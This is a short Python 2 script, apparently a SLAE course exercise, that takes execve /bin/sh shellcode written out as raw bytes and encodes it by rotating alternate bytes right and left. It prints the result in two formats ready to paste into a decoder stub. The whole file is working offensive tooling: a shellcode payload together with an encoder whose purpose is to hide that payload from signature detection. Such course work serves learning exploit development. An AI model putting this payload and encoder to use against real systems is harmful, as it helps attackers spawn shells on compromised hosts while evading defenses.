#!/usr/bin/python
# Author: Ty Gast // SLAE-1461
# Alternating rotate encoder
#   Encoding: first byte rotated right, alternate subsequent bytes
#   Decoding: first byte rotated left, alternate subsequent bytes

import random

# execve stack shell (/bin/sh)
shellcode = ('\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80')

encoded = ""
encoded2 = ""

def rol(byte):
  return ((byte << 1) & 0xFF) | ((byte >> 7) & 0xFF)

def ror(byte):
  return ((byte >> 1) & 0xFF) | ((byte << 7) & 0xFF)

print 'Encoded shellcode...'

count = 0
for x in bytearray(shellcode):
  newx = 0
  if count % 2 == 1:
    newx = rol(x)
  else:
    newx = ror(x)

  count += 1

  encoded += '\\x'
  encoded += '%02x' % newx

  encoded2 += '0x'
  encoded2 += '%02x,' % newx

print encoded
print encoded2

print 'Len: %d' % len(bytearray(shellcode))
